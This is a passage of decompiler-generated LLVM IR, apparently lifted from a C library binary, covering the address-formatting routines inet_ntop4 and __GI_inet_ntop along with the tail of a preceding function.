dec_label_pc_16804:                               ; preds = %dec_label_pc_167ec, %dec_label_pc_167d4, %dec_label_pc_16628, %dec_label_pc_16800
  %v0_16804 = phi i32 [ %v0_16804.pre, %dec_label_pc_167ec ], [ 1, %dec_label_pc_167d4 ], [ %v4_16630, %dec_label_pc_16628 ], [ 0, %dec_label_pc_16800 ]
  store i32 %v0_16804, i32* %r0.global-to-local, align 4
  store i32 %v3_16604, i32* @r4, align 4
  store i32 %v6_16604, i32* @r5, align 4
  store i32 %v9_16604, i32* @r6, align 4
  ret i32 %v0_16804

; uselistorder directives
  uselistorder i32 %v0_16804, { 1, 0 }
  uselistorder i32 %v2_167bc, { 1, 0 }
  uselistorder i32 %v2_167b8, { 1, 0 }
  uselistorder i32 %v0_167c0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_167c8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_167cc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_167cc.pre, { 2, 0, 1 }
  uselistorder i32 %v3_16778, { 1, 0 }
  uselistorder i32 %v0_167cc.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16750, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1672c, { 1, 0 }
  uselistorder i32 %v3_166f0, { 1, 0 }
  uselistorder i32 %v0_166e4, { 1, 0, 2 }
  uselistorder i32 %v1_16694, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1668c, { 1, 0 }
  uselistorder i32 %v0_16670, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 11, 10, 7, 6, 9, 8, 17, 16, 13, 12, 15, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 5, 1, 4, 7, 8, 2, 3, 9, 6, 0, 10, 11, 12, 13 }
  uselistorder i32 58, { 3, 0, 1, 2 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_16804, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16800, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_167cc, { 1, 0 }
  uselistorder label %dec_label_pc_167b4, { 1, 0 }
  uselistorder label %dec_label_pc_16788, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1674c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16680, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16814 = load i32, i32* @r4, align 4
  store i32 %v3_16814, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1af04.642 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_16830 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_16830, i32* @r0, align 4
  %v0_16834 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_16844 = bitcast i32* %stack_var_-51 to i8*
  %v3_16844 = call i32 @__GI_memset(i8* %v2_16844, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1690c = ptrtoint i32* %stack_var_-36 to i32
  %v2_168e8 = add i32 %v2_1690c, -17
  br label %dec_label_pc_1690c

dec_label_pc_16854:                               ; preds = %dec_label_pc_1690c
  %v0_16854 = load i32, i32* %fp.global-to-local, align 4
  %v2_16854 = add i32 %v0_16854, %v1_16854
  %v3_16854 = inttoptr i32 %v2_16854 to i8*
  %v4_16854 = load i8, i8* %v3_16854, align 1
  %v6_16854 = zext i8 %v4_16854 to i32
  store i32 %v6_16854, i32* %r4.global-to-local, align 4
  %v1_16858 = add i32 %v0_16858, 1
  store i32 %v1_16858, i32* %r7.global-to-local, align 4
  store i32 %v2_1690c, i32* %r2.global-to-local, align 4
  %v2_16864 = add i32 %v1_16858, %v2_1690c
  store i32 %v2_16864, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_16854, 100
  %v1_1686c = or i8 %div, 48
  %v3_16870 = add i32 %v2_1691c, -17
  %v4_16870 = inttoptr i32 %v3_16870 to i8*
  store i8 %v1_1686c, i8* %v4_16870, align 1
  %v0_16874 = load i32, i32* %r5.global-to-local, align 4
  %v1_16874 = add i32 %v0_16874, -17
  %v2_16874 = inttoptr i32 %v1_16874 to i8*
  %v3_16874 = load i8, i8* %v2_16874, align 1
  %v7_16878 = icmp eq i8 %v3_16874, 48
  %v0_1687c = load i32, i32* %fp.global-to-local, align 4
  %v1_1687c = load i32, i32* %r8.global-to-local, align 4
  %v2_1687c = add i32 %v1_1687c, %v0_1687c
  store i32 %v2_1687c, i32* %sb.global-to-local, align 4
  %v0_16884 = load i32, i32* %r4.global-to-local, align 4
  %v2_1688c = udiv i32 %v0_16884, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16894 = urem i32 %v2_1688c, 256
  %v2_16898 = urem i32 %v1_16894, 10
  %v1_1689c = or i32 %v2_16898, 48
  %v1_168a0 = trunc i32 %v1_1689c to i8
  br i1 %v7_16878, label %dec_label_pc_1688c, label %dec_label_pc_168b4

dec_label_pc_1688c:                               ; preds = %dec_label_pc_16854
  store i8 %v1_168a0, i8* %v2_16874, align 1
  %v0_168a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_168a4 = add i32 %v0_168a4, -17
  %v2_168a4 = inttoptr i32 %v1_168a4 to i8*
  %v3_168a4 = load i8, i8* %v2_168a4, align 1
  %v7_168a8 = icmp eq i8 %v3_168a4, 48
  br i1 %v7_168a8, label %dec_label_pc_1688c.dec_label_pc_168d8_crit_edge, label %bb

dec_label_pc_1688c.dec_label_pc_168d8_crit_edge:  ; preds = %dec_label_pc_1688c
  %v1_168e8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_168d8

bb:                                               ; preds = %dec_label_pc_1688c
  %v1_168ac = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_168ac, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_168d8

dec_label_pc_168b4:                               ; preds = %dec_label_pc_16854
  %v2_168d0 = load i32, i32* %sl.global-to-local, align 4
  %v3_168d0 = add i32 %v2_168d0, -17
  %v4_168d0 = inttoptr i32 %v3_168d0 to i8*
  store i8 %v1_168a0, i8* %v4_168d0, align 1
  %v0_168d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_168d4 = add i32 %v0_168d4, 1
  store i32 %v1_168d4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_168d8

dec_label_pc_168d8:                               ; preds = %dec_label_pc_1688c.dec_label_pc_168d8_crit_edge, %bb, %dec_label_pc_168b4
  %v1_168e8 = phi i32 [ %v1_168e8.pre, %dec_label_pc_1688c.dec_label_pc_168d8_crit_edge ], [ %v1_168ac, %bb ], [ %v1_168d4, %dec_label_pc_168b4 ]
  %v0_168d8 = load i32, i32* %sb.global-to-local, align 4
  %v1_168d8 = inttoptr i32 %v0_168d8 to i8*
  %v2_168d8 = load i8, i8* %v1_168d8, align 1
  %tmp17 = urem i8 %v2_168d8, 10
  store i32 %v2_1690c, i32* %ip.global-to-local, align 4
  %v1_168ec = add i32 %v1_168e8, 1
  store i32 %v1_168ec, i32* %r1.global-to-local, align 4
  %v1_168f0 = or i8 %tmp17, 48
  %v3_168f4 = add i32 %v2_168e8, %v1_168e8
  %v4_168f4 = inttoptr i32 %v3_168f4 to i8*
  store i8 %v1_168f0, i8* %v4_168f4, align 1
  %v0_168f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_168f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_168f8 = add i32 %v1_168f8, %v0_168f8
  store i32 %v2_168f8, i32* %r2.global-to-local, align 4
  %v3_16900 = add i32 %v2_168f8, -17
  %v4_16900 = inttoptr i32 %v3_16900 to i8*
  store i8 46, i8* %v4_16900, align 1
  %v0_16904 = load i32, i32* %r8.global-to-local, align 4
  %v1_16904 = add i32 %v0_16904, 1
  store i32 %v1_16904, i32* %r8.global-to-local, align 4
  %v0_16908 = load i32, i32* %r1.global-to-local, align 4
  %v1_16908 = add i32 %v0_16908, 1
  br label %dec_label_pc_1690c

dec_label_pc_1690c:                               ; preds = %entry, %dec_label_pc_168d8
  %v0_16858 = phi i32 [ 0, %entry ], [ %v1_16908, %dec_label_pc_168d8 ]
  %v1_16854 = phi i32 [ 0, %entry ], [ %v1_16904, %dec_label_pc_168d8 ]
  store i32 %v2_1690c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_16858, i32* %r6.global-to-local, align 4
  %v2_1691c = add i32 %v0_16858, %v2_1690c
  store i32 %v2_1691c, i32* %r5.global-to-local, align 4
  %v7_16920 = icmp sgt i32 %v1_16854, 3
  br i1 %v7_16920, label %dec_label_pc_16924, label %dec_label_pc_16854

dec_label_pc_16924:                               ; preds = %dec_label_pc_1690c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_16830, i32* %r4.global-to-local, align 4
  %v3_1692c = add i32 %v2_1691c, -18
  %v4_1692c = inttoptr i32 %v3_1692c to i8*
  store i8 0, i8* %v4_1692c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_16934 = call i32 @strlen(i8* %tmp18)
  %v2_16938 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_16934, %v2_16938
  br i1 %tmp, label %dec_label_pc_16944, label %dec_label_pc_16958

dec_label_pc_16944:                               ; preds = %dec_label_pc_16924
  %v0_16944 = call i32 @__errno_location()
  %v0_1694c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1694c, i32* %r2.global-to-local, align 4
  %v2_16950 = inttoptr i32 %v0_16944 to i32*
  store i32 28, i32* %v2_16950, align 4
  %v0_16968.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16968

dec_label_pc_16958:                               ; preds = %dec_label_pc_16924
  store i32 %v2_16830, i32* %r1.global-to-local, align 4
  %v3_16960 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_16960, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16968

dec_label_pc_16968:                               ; preds = %dec_label_pc_16944, %dec_label_pc_16958
  %v0_16968 = phi i32 [ %v0_16968.pre, %dec_label_pc_16944 ], [ %v3_16960, %dec_label_pc_16958 ]
  %v2_16970 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16970, i32* @r4, align 4
  ret i32 %v0_16968

; uselistorder directives
  uselistorder i32 %v2_1691c, { 0, 2, 1 }
  uselistorder i32 %v1_16854, { 1, 0 }
  uselistorder i32 %v0_16858, { 0, 2, 1 }
  uselistorder i32 %v2_1690c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_16968, { 1, 0 }
  uselistorder label %dec_label_pc_1690c, { 1, 0 }
  uselistorder label %dec_label_pc_168d8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16978 = load i32, i32* @r4, align 4
  store i32 %v3_16978, i32* %stack_var_-32, align 4
  %v6_16978 = load i32, i32* @r5, align 4
  %v25_16978 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1697c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1697c, label %dec_label_pc_169a0, label %dec_label_pc_16994

dec_label_pc_16994:                               ; preds = %entry
  %v7_16994 = icmp eq i32 %arg1, 10
  br i1 %v7_16994, label %dec_label_pc_169b4, label %dec_label_pc_16bb4

dec_label_pc_169a0:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_169ac = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_16bac

dec_label_pc_169b4:                               ; preds = %dec_label_pc_16994
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_169c0 = bitcast i32* %stack_var_-64 to i8*
  %v3_169c0 = call i32 @__GI_memset(i8* %v2_169c0, i32 0)
  br label %dec_label_pc_169e0

dec_label_pc_169cc:                               ; preds = %dec_label_pc_169e0
  %tmp68 = icmp slt i32 %v1_169d0, 0
  %v4_169e0 = zext i1 %tmp68 to i32
  %v5_169e0 = add i32 %v4_169e0, %v1_169d0
  %v3_169e4 = sdiv i32 %v5_169e0, 2
  %v4_169f4 = mul i32 %v3_169e4, 4
  %v5_169f4 = add i32 %v4_169f4, %v25_16978
  %v1_169cc = add i32 %v2_169f0, 1
  %v2_169cc = inttoptr i32 %v1_169cc to i8*
  %v3_169cc = load i8, i8* %v2_169cc, align 1
  %v4_169cc = zext i8 %v3_169cc to i32
  %v3_169d0 = inttoptr i32 %v2_169f0 to i8*
  %v4_169d0 = load i8, i8* %v3_169d0, align 1
  %v6_169d0 = zext i8 %v4_169d0 to i32
  store i32 %v6_169d0, i32* %r2.global-to-local, align 4
  %v4_169d4 = mul nuw nsw i32 %v6_169d0, 256
  %v5_169d4 = or i32 %v4_169d4, %v4_169cc
  %v2_169d8 = add i32 %v5_169f4, -32
  %v3_169d8 = inttoptr i32 %v2_169d8 to i32*
  store i32 %v5_169d4, i32* %v3_169d8, align 4
  %v0_169dc = load i32, i32* %r1.global-to-local, align 4
  %v1_169dc = add i32 %v0_169dc, 2
  br label %dec_label_pc_169e0

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169b4, %dec_label_pc_169cc
  %v1_169d0 = phi i32 [ 0, %dec_label_pc_169b4 ], [ %v1_169dc, %dec_label_pc_169cc ]
  store i32 %v1_169d0, i32* %r1.global-to-local, align 4
  %v0_169f0 = load i32, i32* @r8, align 4
  %v2_169f0 = add i32 %v0_169f0, %v1_169d0
  store i32 %v2_169f0, i32* %r2.global-to-local, align 4
  %v7_169f8 = icmp sgt i32 %v1_169d0, 15
  br i1 %v7_169f8, label %dec_label_pc_169fc, label %dec_label_pc_169cc

dec_label_pc_169fc:                               ; preds = %dec_label_pc_169e0
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_169fc, %dec_label_pc_16a58
  %v0_16a4c = phi i32 [ -1, %dec_label_pc_169fc ], [ %v0_16a80, %dec_label_pc_16a58 ]
  %v0_16a3c = phi i32 [ -1, %dec_label_pc_169fc ], [ %v0_16a6c, %dec_label_pc_16a58 ]
  %v0_16a20 = phi i32 [ -1, %dec_label_pc_169fc ], [ %v0_16a208, %dec_label_pc_16a58 ]
  %v0_16a58 = phi i32 [ 0, %dec_label_pc_169fc ], [ %v1_16a58, %dec_label_pc_16a58 ]
  %v4_16a10 = mul nuw nsw i32 %v0_16a58, 4
  %v5_16a10 = add i32 %v4_16a10, %v25_16978
  %v1_16a14 = add i32 %v5_16a10, -32
  %v2_16a14 = inttoptr i32 %v1_16a14 to i32*
  %v3_16a14 = load i32, i32* %v2_16a14, align 4
  %v2_16a18 = icmp eq i32 %v3_16a14, 0
  %v7_16a20 = icmp eq i32 %v0_16a20, -1
  br i1 %v2_16a18, label %dec_label_pc_16a20, label %dec_label_pc_16a34

dec_label_pc_16a20:                               ; preds = %dec_label_pc_16a0c
  br i1 %v7_16a20, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16a20
  store i32 %v0_16a58, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_16a58

.thread:                                          ; preds = %dec_label_pc_16a20
  %v1_16a2c.pre = load i32, i32* @r4, align 4
  %v2_16a2c = add i32 %v1_16a2c.pre, 1
  store i32 %v2_16a2c, i32* @r4, align 4
  br label %dec_label_pc_16a58

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a0c
  br i1 %v7_16a20, label %dec_label_pc_16a58, label %dec_label_pc_16a3c

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_16a34
  %v7_16a3c = icmp eq i32 %v0_16a3c, -1
  %v0_16a50.pre = load i32, i32* @r4, align 4
  %v1_16a44 = load i32, i32* @r7, align 4
  %v7_16a48 = icmp sgt i32 %v0_16a50.pre, %v1_16a44
  %or.cond = or i1 %v7_16a3c, %v7_16a48
  br i1 %or.cond, label %dec_label_pc_16a4c, label %dec_label_pc_16a54

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_16a3c
  store i32 %v0_16a4c, i32* @r6, align 4
  store i32 %v0_16a50.pre, i32* @r7, align 4
  br label %dec_label_pc_16a54

dec_label_pc_16a54:                               ; preds = %dec_label_pc_16a3c, %dec_label_pc_16a4c
  %v0_16a3c13 = phi i32 [ %v0_16a4c, %dec_label_pc_16a4c ], [ %v0_16a3c, %dec_label_pc_16a3c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a58

dec_label_pc_16a58:                               ; preds = %bb, %.thread, %dec_label_pc_16a34, %dec_label_pc_16a54
  %v0_16a80 = phi i32 [ %v0_16a4c, %.thread ], [ %v0_16a58, %bb ], [ %v0_16a4c, %dec_label_pc_16a34 ], [ -1, %dec_label_pc_16a54 ]
  %v0_16a208 = phi i32 [ %v0_16a20, %.thread ], [ %v0_16a58, %bb ], [ -1, %dec_label_pc_16a34 ], [ -1, %dec_label_pc_16a54 ]
  %v0_16a6c = phi i32 [ %v0_16a3c, %.thread ], [ %v0_16a3c, %bb ], [ %v0_16a3c, %dec_label_pc_16a34 ], [ %v0_16a3c13, %dec_label_pc_16a54 ]
  %v1_16a58 = add nuw nsw i32 %v0_16a58, 1
  store i32 %v1_16a58, i32* %r1.global-to-local, align 4
  %v7_16a60 = icmp slt i32 %v1_16a58, 8
  br i1 %v7_16a60, label %dec_label_pc_16a0c, label %dec_label_pc_16a64

dec_label_pc_16a64:                               ; preds = %dec_label_pc_16a58
  %v7_16a64 = icmp eq i32 %v0_16a80, -1
  br i1 %v7_16a64, label %dec_label_pc_16a84, label %dec_label_pc_16a6c

dec_label_pc_16a6c:                               ; preds = %dec_label_pc_16a64
  %v7_16a6c = icmp eq i32 %v0_16a6c, -1
  %v0_16a7c.pre = load i32, i32* @r4, align 4
  br i1 %v7_16a6c, label %dec_label_pc_16a7c, label %dec_label_pc_16a74

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a6c
  %v1_16a74 = load i32, i32* @r7, align 4
  %v7_16a78 = icmp sgt i32 %v0_16a7c.pre, %v1_16a74
  br i1 %v7_16a78, label %dec_label_pc_16a7c, label %dec_label_pc_16a84

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a6c, %dec_label_pc_16a74
  store i32 %v0_16a7c.pre, i32* @r7, align 4
  store i32 %v0_16a80, i32* @r6, align 4
  br label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a74, %dec_label_pc_16a64, %dec_label_pc_16a7c
  %v0_16a84 = phi i32 [ %v0_16a6c, %dec_label_pc_16a74 ], [ %v0_16a6c, %dec_label_pc_16a64 ], [ %v0_16a80, %dec_label_pc_16a7c ]
  %v7_16a84 = icmp eq i32 %v0_16a84, -1
  br i1 %v7_16a84, label %bb49, label %dec_label_pc_16a8c

dec_label_pc_16a8c:                               ; preds = %dec_label_pc_16a84
  %v0_16a8c = load i32, i32* @r7, align 4
  %v7_16a90 = icmp slt i32 %v0_16a8c, 2
  br i1 %v7_16a90, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_16a8c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16a84, %dec_label_pc_16a8c, %bb48
  %v0_16aa023 = phi i32 [ %v0_16a84, %dec_label_pc_16a84 ], [ %v0_16a84, %dec_label_pc_16a8c ], [ -1, %bb48 ]
  %v2_16a94 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_16a94, i32* @r4, align 4
  %v9_16b00 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_16aa063 = icmp eq i32 %v0_16aa023, -1
  br label %dec_label_pc_16aa0

dec_label_pc_16aa0:                               ; preds = %bb49, %dec_label_pc_16b54
  %v7_16aa067 = phi i1 [ %v7_16aa063, %bb49 ], [ %v7_16aa0, %dec_label_pc_16b54 ]
  %v0_16acc66 = phi i32 [ 0, %bb49 ], [ %v1_16b54, %dec_label_pc_16b54 ]
  %v1_16abc65 = phi i32 [ %v0_16aa023, %bb49 ], [ %v0_16aa0.pre, %dec_label_pc_16b54 ]
  %v3_16ad464 = phi i32 [ %v2_16a94, %bb49 ], [ %v3_16ac424, %dec_label_pc_16b54 ]
  br i1 %v7_16aa067, label %dec_label_pc_16acc, label %dec_label_pc_16aa8

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16aa0
  %v9_16aa8 = icmp eq i32 %v0_16acc66, %v1_16abc65
  %v5_16aac = icmp slt i32 %v0_16acc66, %v1_16abc65
  br i1 %v5_16aac, label %dec_label_pc_16acc, label %dec_label_pc_16ab0

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16aa8
  %v1_16ab0 = load i32, i32* @r7, align 4
  %v2_16ab0 = add i32 %v1_16ab0, %v1_16abc65
  %v6_16ab8 = icmp slt i32 %v0_16acc66, %v2_16ab0
  br i1 %v6_16ab8, label %dec_label_pc_16abc, label %dec_label_pc_16acc

dec_label_pc_16abc:                               ; preds = %dec_label_pc_16ab0
  br i1 %v9_16aa8, label %bb51, label %dec_label_pc_16b54

bb51:                                             ; preds = %dec_label_pc_16abc
  %v4_16ac4 = inttoptr i32 %v3_16ad464 to i8*
  store i8 58, i8* %v4_16ac4, align 1
  %v5_16ac4 = load i32, i32* @r4, align 4
  %v6_16ac4 = add i32 %v5_16ac4, 1
  store i32 %v6_16ac4, i32* @r4, align 4
  br label %dec_label_pc_16b54

dec_label_pc_16acc:                               ; preds = %dec_label_pc_16ab0, %dec_label_pc_16aa8, %dec_label_pc_16aa0
  %v2_16acc = icmp eq i32 %v0_16acc66, 0
  br i1 %v2_16acc, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_16acc
  %v4_16ad4 = inttoptr i32 %v3_16ad464 to i8*
  store i8 58, i8* %v4_16ad4, align 1
  %v5_16ad4 = load i32, i32* @r4, align 4
  %v6_16ad4 = add i32 %v5_16ad4, 1
  store i32 %v6_16ad4, i32* @r4, align 4
  %v0_16ad8.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16acc, %bb52
  %v0_16b18 = phi i32 [ %v3_16ad464, %dec_label_pc_16acc ], [ %v6_16ad4, %bb52 ]
  %v1_16b3c = phi i32 [ 0, %dec_label_pc_16acc ], [ %v0_16ad8.pre, %bb52 ]
  %v7_16ad8 = icmp eq i32 %v1_16b3c, 6
  br i1 %v7_16ad8, label %dec_label_pc_16ae0, label %dec_label_pc_16b38

dec_label_pc_16ae0:                               ; preds = %.thread3
  %v0_16ae0 = load i32, i32* @r6, align 4
  %v2_16ae0 = icmp eq i32 %v0_16ae0, 0
  br i1 %v2_16ae0, label %dec_label_pc_16ae8, label %dec_label_pc_16b38

dec_label_pc_16ae8:                               ; preds = %dec_label_pc_16ae0
  %v0_16ae8 = load i32, i32* @r7, align 4
  %v7_16ae8 = icmp eq i32 %v0_16ae8, 6
  br i1 %v7_16ae8, label %dec_label_pc_16b08, label %dec_label_pc_16af0

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ae8
  %v7_16af0 = icmp eq i32 %v0_16ae8, 5
  br i1 %v7_16af0, label %dec_label_pc_16af8, label %dec_label_pc_16b38

dec_label_pc_16af8:                               ; preds = %dec_label_pc_16af0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_16b00, label %dec_label_pc_16b08, label %dec_label_pc_16b38

dec_label_pc_16b08:                               ; preds = %dec_label_pc_16af8, %dec_label_pc_16ae8
  %v2_16b0c = sub i32 %v25_16978, %v0_16b18
  %v0_16b10 = load i32, i32* @r8, align 4
  %v1_16b10 = add i32 %v0_16b10, 12
  %v1_16b14 = add i32 %v2_16b0c, -32
  store i32 %v1_16b14, i32* %r2.global-to-local, align 4
  store i32 %v0_16b18, i32* %r1.global-to-local, align 4
  %v3_16b1c = call i32 @inet_ntop4(i32 %v1_16b10, i32 %v0_16b18, i32 %v1_16b14)
  %v2_16b20 = icmp eq i32 %v3_16b1c, 0
  br i1 %v2_16b20, label %dec_label_pc_16bac, label %dec_label_pc_16b28

dec_label_pc_16b28:                               ; preds = %dec_label_pc_16b08
  %v0_16b28 = load i32, i32* @r4, align 4
  %v1_16b28 = inttoptr i32 %v0_16b28 to i8*
  %v3_16b2c = call i32 @strlen(i8* %v1_16b28)
  %v0_16b30 = load i32, i32* @r4, align 4
  %v2_16b30 = add i32 %v0_16b30, %v3_16b2c
  store i32 %v2_16b30, i32* @r4, align 4
  %v0_16b68.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16b68

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16af8, %dec_label_pc_16af0, %dec_label_pc_16ae0, %.thread3
  %v4_16b3c = mul i32 %v1_16b3c, 4
  %v5_16b3c = add i32 %v4_16b3c, %v25_16978
  store i32 %v0_16b18, i32* @r0, align 4
  %v1_16b44 = add i32 %v5_16b3c, -32
  %v2_16b44 = inttoptr i32 %v1_16b44 to i32*
  %v3_16b44 = load i32, i32* %v2_16b44, align 4
  store i32 %v3_16b44, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1af2c.645 to i32), i32* %r1.global-to-local, align 4
  %v7_16b4c = call i32 @sprintf(i32 %v0_16b18, i32 ptrtoint ([3 x i8]* @global_var_1af2c.645 to i32), i32 %v3_16b44, i32 %v5_16b3c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_16b50 = load i32, i32* @r4, align 4
  %v2_16b50 = add i32 %v0_16b50, %v7_16b4c
  store i32 %v2_16b50, i32* @r4, align 4
  br label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %dec_label_pc_16abc, %bb51, %dec_label_pc_16b38
  %v3_16ac424 = phi i32 [ %v3_16ad464, %dec_label_pc_16abc ], [ %v6_16ac4, %bb51 ], [ %v2_16b50, %dec_label_pc_16b38 ]
  %v0_16b54 = load i32, i32* @r5, align 4
  %v1_16b54 = add i32 %v0_16b54, 1
  %v0_16aa0.pre = load i32, i32* @r6, align 4
  store i32 %v1_16b54, i32* @r5, align 4
  %v7_16b5c = icmp slt i32 %v1_16b54, 8
  %v7_16aa0 = icmp eq i32 %v0_16aa0.pre, -1
  br i1 %v7_16b5c, label %dec_label_pc_16aa0, label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16b54
  br i1 %v7_16aa0, label %.thread4, label %dec_label_pc_16b68

dec_label_pc_16b68:                               ; preds = %dec_label_pc_16b60, %dec_label_pc_16b28
  %v3_16b74 = phi i32 [ %v3_16ac424, %dec_label_pc_16b60 ], [ %v2_16b30, %dec_label_pc_16b28 ]
